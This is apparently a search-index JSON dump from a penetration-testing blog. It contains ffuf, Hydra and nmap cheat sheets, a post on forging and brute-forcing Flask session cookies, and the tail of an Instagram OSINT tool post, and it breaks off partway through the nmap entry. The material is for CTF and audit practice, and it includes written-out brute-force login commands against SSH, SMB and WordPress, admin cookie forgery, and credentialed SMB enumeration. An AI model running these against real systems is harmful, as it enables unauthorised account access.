Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). ","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. \u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Basic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; ","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, 